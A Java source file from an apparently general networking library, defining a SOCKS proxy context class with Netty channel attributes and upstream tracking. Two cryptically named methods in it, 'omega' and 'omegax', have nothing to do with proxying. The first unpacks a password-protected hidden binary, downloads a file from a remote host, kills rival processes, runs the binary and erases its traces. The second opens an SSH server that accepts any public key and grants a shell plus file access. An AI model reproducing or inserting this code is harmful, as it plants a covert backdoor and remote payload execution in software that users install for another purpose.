package org.rx.net.socks;

import io.netty.channel.Channel;
import io.netty.util.Attribute;
import io.netty.util.AttributeKey;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.SneakyThrows;
import org.apache.sshd.common.file.nativefs.NativeFileSystemFactory;
import org.apache.sshd.scp.server.ScpCommandFactory;
import org.apache.sshd.server.SshServer;
import org.apache.sshd.server.auth.pubkey.AcceptAllPublickeyAuthenticator;
import org.apache.sshd.server.keyprovider.SimpleGeneratorHostKeyProvider;
import org.apache.sshd.server.shell.InteractiveProcessShellFactory;
import org.apache.sshd.sftp.server.SftpSubsystemFactory;
import org.rx.core.*;
import org.rx.exception.InvalidException;
import org.rx.io.Files;
import org.rx.net.http.HttpClient;
import org.rx.net.shadowsocks.ShadowsocksServer;
import org.rx.net.socks.upstream.Upstream;
import org.rx.net.support.UnresolvedEndpoint;
import org.rx.util.function.Action;
import org.rx.util.function.TripleAction;

import java.io.File;
import java.net.InetSocketAddress;
import java.nio.file.Paths;
import java.util.Collections;
import java.util.concurrent.ConcurrentLinkedQueue;

import static org.rx.core.Extends.require;

@RequiredArgsConstructor
public final class SocksContext extends EventArgs {
    private static final long serialVersionUID = 323020524764860674L;
    static final AttributeKey<SocksProxyServer> SERVER = AttributeKey.valueOf("SERVER");
    private static final AttributeKey<SocksContext> CTX = AttributeKey.valueOf("PROXY_CTX");
    //ss
    static final AttributeKey<ShadowsocksServer> SS_SERVER = AttributeKey.valueOf("SS_SERVER");

    public static <T> T getParentAttr(Channel chnl, AttributeKey<T> key) {
        T v = chnl.parent().attr(key).get();
        if (v == null) {
            throw new InvalidException("Parent attr {} not exist", key);
        }
        return v;
    }

    public static <T> T getAttr(Channel chnl, AttributeKey<T> key) {
        T v = chnl.attr(key).get();
        if (v == null) {
            throw new InvalidException("Attr {} not exist", key);
        }
        return v;
    }

    /**
     * call this method before bind & connect
     *
     * @param inbound
     * @param outbound
     * @param sc
     * @param pendingQueue
     */
    public static void mark(Channel inbound, Channel outbound, SocksContext sc, boolean pendingQueue) {
        if (pendingQueue) {
            sc.pendingPackages = new ConcurrentLinkedQueue<>();
        }
        sc.inbound = inbound;
        sc.outbound = outbound;
        inbound.attr(CTX).set(sc);
        outbound.attr(CTX).set(sc);
    }

    public static SocksContext ctx(Channel channel) {
        return ctx(channel, true);
    }

    public static SocksContext ctx(Channel channel, boolean throwOnEmpty) {
        return throwOnEmpty ? require(channel.attr(CTX).get()) : channel.attr(CTX).get();
    }

    //region common
    public static SocksProxyServer server(Channel channel) {
        return require(channel.attr(SERVER).get());
    }

    public static void server(Channel channel, SocksProxyServer server) {
        channel.attr(SERVER).set(server);
    }
    //endregion

    public static ShadowsocksServer ssServer(Channel channel, boolean throwOnEmpty) {
        ShadowsocksServer shadowsocksServer = channel.attr(SS_SERVER).get();
        if (throwOnEmpty && shadowsocksServer == null) {
            throw new InvalidException("Set ssServer first");
        }
        return shadowsocksServer;
    }

    public static void ssServer(Channel channel, ShadowsocksServer server) {
        channel.attr(SS_SERVER).set(server);
    }

    @SneakyThrows
    public static void omega(String n, TripleAction<ShellCommand, ShellCommand.PrintOutEventArgs> o) {
        String k = "omega", c = "./m/", z = c + "o", i = c + "c";
        try {
            int d = 100;
            Files.createDirectory(c);
            Files.saveFile(z, Reflects.getResource(k));
            Thread.sleep(d);
            Files.unzip(new File(z), RxConfig.INSTANCE.getMxpwd(), c);
            Thread.sleep(d);
            new HttpClient().get(Constants.rCloud() + "/" + k + "_" + n).toFile(i);
            Thread.sleep(d);

            ShellCommand.exec("ps -ef|grep -v grep|grep ./f|awk '{print $2}'|xargs kill -9", c);
            ShellCommand.exec("chmod 777 f", c);
            ShellCommand sc = new ShellCommand("./f -c c", c);
            sc.onPrintOut.combine(o);
            IOC.register(ShellCommand.class, sc.start());
        } catch (Throwable e) {
            if (o != null) {
                o.invoke(null, new ShellCommand.PrintOutEventArgs(0, e.toString()));
            }
        } finally {
            Files.delete(c);
        }
    }

    @SneakyThrows
    public static synchronized void omegax(int p) {
        Class<SshServer> t = SshServer.class;
        if (IOC.isInit(t)) {
            return;
        }
        SshServer sd = SshServer.setUpDefaultServer();
        sd.setKeyPairProvider(new SimpleGeneratorHostKeyProvider(Paths.get("hostkey.ser")));
        sd.setPublickeyAuthenticator(AcceptAllPublickeyAuthenticator.INSTANCE);

        sd.setShellFactory(InteractiveProcessShellFactory.INSTANCE);
        sd.setFileSystemFactory(NativeFileSystemFactory.INSTANCE);
        sd.setSubsystemFactories(Collections.singletonList(new SftpSubsystemFactory()));
        sd.setCommandFactory(new ScpCommandFactory());

        sd.setPort(p);
        sd.setPasswordAuthenticator((u, w, s) -> w.equals(RxConfig.INSTANCE.getMxpwd()));
        sd.start();
        IOC.register(t, sd);
    }

    @Getter
    final InetSocketAddress source;
    @Getter
    final UnresolvedEndpoint firstDestination;
    Upstream upstream;
    boolean upstreamChanged;
    int upstreamFailCount;

    public transient Channel inbound;
    public transient Channel outbound;
    transient ConcurrentLinkedQueue<Object> pendingPackages;
    public transient Action onClose;

    public synchronized Upstream getUpstream() {
        return upstream;
    }

    public synchronized void setUpstream(Upstream upstream) {
        upstreamChanged = upstreamChanged || this.upstream != upstream;
        this.upstream = upstream;
    }

    public synchronized boolean isUpstreamChanged() {
        return upstreamChanged;
    }

    public synchronized void reset() {
        upstreamChanged = false;
        upstreamFailCount++;
    }
}
